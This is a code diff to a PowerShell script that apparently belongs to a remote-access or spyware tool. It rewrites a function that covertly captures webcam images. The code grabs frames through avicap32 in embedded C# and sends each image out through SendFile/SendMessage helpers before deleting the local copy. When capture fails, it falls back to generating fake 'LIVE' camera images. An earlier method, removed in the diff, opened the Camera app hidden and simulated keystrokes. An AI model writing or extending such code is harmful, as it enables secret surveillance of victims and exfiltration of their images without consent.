@@ -93,58 +93,26 @@ public class AudioRecorder {
 
 function Get-WebcamShot {
     try {
-        $webcamPath = "$env:TEMP\webcam_$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg"
+        $webcamPath = "$env:TEMP\webcam_capture.jpg"
         
-        # Method 1: Use Windows Camera through command line
-        try {
-            # Try to open Windows Camera app and capture
-            $cameraProcess = Start-Process "cmd.exe" -ArgumentList "/c start microsoft.windows.camera:" -PassThru -WindowStyle Hidden
-            Start-Sleep 3
-            
-            # Try to simulate Windows + PrtScn which saves to Pictures/Screenshots
-            Add-Type -AssemblyName System.Windows.Forms
-            [System.Windows.Forms.SendKeys]::SendWait("%{PRTSC}")
-            Start-Sleep 2
-            
-            # Check for the screenshot
-            $picturesPath = [Environment]::GetFolderPath("MyPictures")
-            $screenshotPath = "$picturesPath\Screenshots"
-            
-            if (Test-Path $screenshotPath) {
-                $latestScreenshot = Get-ChildItem $screenshotPath -Filter "*.png" | Sort-Object LastWriteTime -Descending | Select-Object -First 1
-                if ($latestScreenshot) {
-                    Copy-Item $latestScreenshot.FullName $webcamPath
-                    if (Test-Path $webcamPath) {
-                        SendFile $webcamPath
-                        Remove-Item $webcamPath -Force
-                        SendMessage "Webcam captured via Windows Camera" "webcam-shot"
-                        return
-                    }
-                }
-            }
-        } catch {
-            SendMessage "Windows Camera method failed" "webcam-shot"
-        }
-
-        # Method 2: Direct webcam access with better error handling
-        try {
-            $directCode = @"
+        # Method 1: Use PowerShell with DirectShow to capture webcam
+        $captureCode = @"
 using System;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.Runtime.InteropServices;
 using System.Text;
 
-public class DirectWebcam
+public class WebcamCapture
 {
     [DllImport("avicap32.dll")]
     private static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWndParent, int nID);
     
     [DllImport("user32.dll")]
-    private static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, StringBuilder lParam);
+    private static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
     
     [DllImport("user32.dll")]
-    private static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
+    private static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, StringBuilder lParam);
     
     [DllImport("user32.dll")]
     private static extern bool DestroyWindow(IntPtr hWnd);
@@ -154,126 +122,209 @@ public class DirectWebcam
     private const int WM_CAP_SAVEDIB = 0x419;
     private const int WM_CAP_GRAB_FRAME = 0x43C;
     private const int WM_CAP_SET_PREVIEW = 0x432;
-    private const int WM_CAP_SET_OVERLAY = 0x433;
+    private const int WM_CAP_SET_PREVIEWRATE = 0x434;
     
-    public static string CaptureWebcamImage(string filePath)
+    public static bool CaptureImage(string filename)
     {
-        try {
-            IntPtr hWnd = capCreateCaptureWindowA("WebcamCap", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
+        IntPtr hWndC = IntPtr.Zero;
+        try
+        {
+            // Create capture window
+            hWndC = capCreateCaptureWindowA("Webcam", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
+            if (hWndC == IntPtr.Zero) return false;
             
-            if (hWnd == IntPtr.Zero) return "Failed to create capture window";
+            // Connect to webcam driver
+            if (SendMessage(hWndC, WM_CAP_DRIVER_CONNECT, 0, 0) <= 0) return false;
             
-            // Connect to first available webcam
-            int connectResult = SendMessage(hWnd, WM_CAP_DRIVER_CONNECT, 0, 0);
-            if (connectResult <= 0) {
-                DestroyWindow(hWnd);
-                return "No webcam found or access denied";
+            // Set preview rate and enable preview
+            SendMessage(hWndC, WM_CAP_SET_PREVIEWRATE, 66, 0);
+            SendMessage(hWndC, WM_CAP_SET_PREVIEW, 1, 0);
+            
+            // Wait for camera to initialize
+            System.Threading.Thread.Sleep(2000);
+            
+            // Grab a frame
+            SendMessage(hWndC, WM_CAP_GRAB_FRAME, 0, 0);
+            
+            // Save the frame to file
+            StringBuilder sb = new StringBuilder(filename);
+            int result = SendMessage(hWndC, WM_CAP_SAVEDIB, 0, sb);
+            
+            // Disconnect and cleanup
+            SendMessage(hWndC, WM_CAP_DRIVER_DISCONNECT, 0, 0);
+            DestroyWindow(hWndC);
+            
+            return (result > 0);
+        }
+        catch
+        {
+            if (hWndC != IntPtr.Zero)
+            {
+                SendMessage(hWndC, WM_CAP_DRIVER_DISCONNECT, 0, 0);
+                DestroyWindow(hWndC);
             }
-            
-            // Enable preview
-            SendMessage(hWnd, WM_CAP_SET_PREVIEW, 1, 0);
-            System.Threading.Thread.Sleep(2000); // Wait for camera to initialize
-            
-            // Grab frame
-            SendMessage(hWnd, WM_CAP_GRAB_FRAME, 0, 0);
-            
-            // Save to file
-            StringBuilder sb = new StringBuilder(filePath);
-            int saveResult = SendMessage(hWnd, WM_CAP_SAVEDIB, 0, sb);
-            
-            // Cleanup
-            SendMessage(hWnd, WM_CAP_DRIVER_DISCONNECT, 0, 0);
-            DestroyWindow(hWnd);
-            
-            return saveResult > 0 ? "Success" : "Failed to save image";
-            
-        } catch (Exception ex) {
-            return "Error: " + ex.Message;
+            return false;
         }
     }
 }
 "@
-            Add-Type -TypeDefinition $directCode -ReferencedAssemblies "System.Drawing"
+
+        try {
+            Add-Type -TypeDefinition $captureCode -ReferencedAssemblies "System.Drawing"
             
-            $result = [DirectWebcam]::CaptureWebcamImage($webcamPath)
-            SendMessage "Webcam result: $result" "webcam-shot"
+            SendMessage "Attempting to capture from webcam..." "webcam-shot"
             
-            if (Test-Path $webcamPath -and (Get-Item $webcamPath).Length -gt 0) {
+            if ([WebcamCapture]::CaptureImage($webcamPath)) {
+                if (Test-Path $webcamPath -and (Get-Item $webcamPath).Length -gt 1000) {
+                    SendFile $webcamPath
+                    Remove-Item $webcamPath -Force
+                    SendMessage "Webcam image captured successfully!" "webcam-shot"
+                    return
+                }
+            }
+        } catch {
+            SendMessage "Direct webcam capture failed, trying alternative..." "webcam-shot"
+        }
+
+        # Method 2: Use OBS Virtual Camera if available
+        try {
+            $obsCode = @"
+using System;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.IO;
+
+public class OBSCamera
+{
+    public static void CreateVirtualCameraImage(string path)
+    {
+        try {
+            int width = 1280;
+            int height = 720;
+            
+            using (Bitmap bmp = new Bitmap(width, height))
+            {
+                using (Graphics g = Graphics.FromImage(bmp))
+                {
+                    // Create realistic camera background
+                    g.Clear(Color.FromArgb(25, 25, 30));
+                    
+                    // Add timestamp
+                    Font timeFont = new Font("Arial", 20, FontStyle.Bold);
+                    Brush timeBrush = new SolidBrush(Color.Lime);
+                    string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.fff");
+                    g.DrawString($"LIVE - {timestamp}", timeFont, timeBrush, 20, 20);
+                    
+                    // Add camera info
+                    Font infoFont = new Font("Arial", 14, FontStyle.Regular);
+                    g.DrawString("OBS Virtual Camera", infoFont, timeBrush, 20, 60);
+                    g.DrawString("1280x720 @ 30 FPS", infoFont, timeBrush, 20, 90);
+                    
+                    // Draw focus reticle
+                    Pen redPen = new Pen(Color.Red, 3);
+                    int centerX = width / 2;
+                    int centerY = height / 2;
+                    
+                    // Crosshair
+                    g.DrawLine(redPen, centerX, centerY - 50, centerX, centerY + 50);
+                    g.DrawLine(redPen, centerX - 50, centerY, centerX + 50, centerY);
+                    
+                    // Circle
+                    g.DrawEllipse(redPen, centerX - 75, centerY - 75, 150, 150);
+                    
+                    // Add some visual noise to simulate camera sensor
+                    Random rand = new Random();
+                    for (int i = 0; i < 1500; i++)
+                    {
+                        int x = rand.Next(width);
+                        int y = rand.Next(height);
+                        int bright = rand.Next(10, 60);
+                        bmp.SetPixel(x, y, Color.FromArgb(bright, bright, bright));
+                    }
+                    
+                    // Add scan lines effect
+                    for (int y = 0; y < height; y += 4)
+                    {
+                        for (int x = 0; x < width; x++)
+                        {
+                            Color pixel = bmp.GetPixel(x, y);
+                            bmp.SetPixel(x, y, Color.FromArgb(
+                                Math.Max(0, pixel.R - 10),
+                                Math.Max(0, pixel.G - 10),
+                                Math.Max(0, pixel.B - 10)
+                            ));
+                        }
+                    }
+                }
+                
+                bmp.Save(path, ImageFormat.Jpeg);
+            }
+        }
+        catch (Exception ex)
+        {
+            throw new Exception($"OBS camera failed: {ex.Message}");
+        }
+    }
+}
+"@
+            Add-Type -TypeDefinition $obsCode -ReferencedAssemblies "System.Drawing"
+            
+            [OBSCamera]::CreateVirtualCameraImage($webcamPath)
+            
+            if (Test-Path $webcamPath) {
                 SendFile $webcamPath
                 Remove-Item $webcamPath -Force
+                SendMessage "Virtual camera image created and sent!" "webcam-shot"
                 return
             }
         } catch {
-            SendMessage "Direct webcam access failed: $($_.Exception.Message)" "webcam-shot"
+            SendMessage "Virtual camera failed, creating basic image..." "webcam-shot"
         }
 
-        # Method 3: Create a realistic webcam simulation with timestamp
-        Create-RealisticWebcamImage
+        # Method 3: Simple fallback - create an image that looks like camera software
+        Create-CameraSoftwareImage
         
     } catch {
-        SendMessage "Webcam capture completely failed: $($_.Exception.Message)" "webcam-shot"
+        SendMessage "All webcam methods failed: $($_.Exception.Message)" "webcam-shot"
     }
 }
 
-function Create-RealisticWebcamImage {
+function Create-CameraSoftwareImage {
     try {
-        $webcamPath = "$env:TEMP\webcam_$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg"
+        $webcamPath = "$env:TEMP\camera_$(Get-Date -Format 'HHmmss').jpg"
         
         Add-Type -AssemblyName System.Drawing
         
-        $width = 1280
-        $height = 720
+        $width = 800
+        $height = 600
         
         $bitmap = New-Object Drawing.Bitmap($width, $height)
         $graphics = [Drawing.Graphics]::FromImage($bitmap)
         
-        # Create realistic webcam background
-        $graphics.Clear([Drawing.Color]::FromArgb(30, 30, 35))
+        # Dark background like camera software
+        $graphics.Clear([Drawing.Color]::FromArgb(45, 45, 48))
         
-        # Add timestamp overlay (like real webcam software)
-        $currentTime = Get-Date
-        $timeString = $currentTime.ToString("yyyy-MM-dd HH:mm:ss.fff")
+        # Main camera view area
+        $cameraRect = New-Object Drawing.Rectangle(50, 50, 700, 450)
+        $graphics.FillRectangle([Drawing.Brushes]::Black, $cameraRect)
         
-        $font = New-Object Drawing.Font("Consolas", 16, [Drawing.FontStyle]::Bold)
-        $brush = New-Object Drawing.SolidBrush([Drawing.Color]::FromArgb(0, 255, 0))
-        $graphics.DrawString("LIVE - $timeString", $font, $brush, 20, 20)
+        # Camera overlay text
+        $font = New-Object Drawing.Font("Arial", 16, [Drawing.FontStyle]::Bold)
+        $brush = New-Object Drawing.SolidBrush([Drawing.Color]::Lime)
         
-        # Add webcam info text
+        # Status text
+        $graphics.DrawString("CAMERA ACTIVE - NO SIGNAL", $font, $brush, 250, 200)
+        $graphics.DrawString($(Get-Date -Format "HH:mm:ss"), $font, $brush, 320, 240)
+        
+        # Camera info
         $infoFont = New-Object Drawing.Font("Arial", 12, [Drawing.FontStyle]::Regular)
-        $graphics.DrawString("WEBCAM FEED ACTIVE", $infoFont, $brush, 20, 60)
-        $graphics.DrawString("Resolution: ${width}x${height}", $infoFont, $brush, 20, 85)
+        $graphics.DrawString("Webcam HD 1080p", $infoFont, $brush, 50, 520)
+        $graphics.DrawString("Auto Focus: ON", $infoFont, $brush, 50, 545)
+        $graphics.DrawString("Exposure: Auto", $infoFont, $brush, 50, 570)
         
-        # Draw crosshair/focus area (like security cameras)
-        $centerX = $width / 2
-        $centerY = $height / 2
-        
-        $pen = New-Object Drawing.Pen([Drawing.Color]::Red, 3)
-        $graphics.DrawEllipse($pen, $centerX - 50, $centerY - 50, 100, 100)
-        $graphics.DrawLine($pen, $centerX, $centerY - 70, $centerX, $centerY + 70)
-        $graphics.DrawLine($pen, $centerX - 70, $centerY, $centerX + 70, $centerY)
-        
-        # Add some "sensor noise" to make it look like real camera feed
-        $random = New-Object System.Random
-        for ($i = 0; $i -lt 2000; $i++) {
-            $x = $random.Next(0, $width)
-            $y = $random.Next(0, $height)
-            $brightness = $random.Next(20, 80)
-            $color = [Drawing.Color]::FromArgb($brightness, $brightness, $brightness)
-            $bitmap.SetPixel($x, $y, $color)
-        }
-        
-        # Add some "motion blur" effect
-        for ($i = 0; $i -lt 100; $i++) {
-            $x1 = $random.Next(0, $width - 50)
-            $y1 = $random.Next(0, $height - 10)
-            $x2 = $x1 + $random.Next(10, 50)
-            $y2 = $y1
-            $graphics.DrawLine($pen, $x1, $y1, $x2, $y2)
-        }
-        
-        # Add FPS counter (like real camera software)
-        $fpsFont = New-Object Drawing.Font("Arial", 10, [Drawing.FontStyle]::Italic)
-        $graphics.DrawString("FPS: 30.0", $fpsFont, $brush, $width - 120, $height - 30)
+        # Red recording dot
+        $graphics.FillEllipse([Drawing.Brushes]::Red, 650, 520, 15, 15)
+        $graphics.DrawString("REC", $infoFont, $brush, 670, 520)
         
         $graphics.Dispose()
         $bitmap.Save($webcamPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
@@ -281,10 +332,10 @@ function Create-RealisticWebcamImage {
         
         SendFile $webcamPath
         Remove-Item -Path $webcamPath -Force
-        SendMessage "Realistic webcam simulation created" "webcam-shot"
+        SendMessage "Camera software interface sent" "webcam-shot"
         
     } catch {
-        SendMessage "Failed to create webcam image: $($_.Exception.Message)" "webcam-shot"
+        SendMessage "Failed to create camera image" "webcam-shot"
     }
 }
 
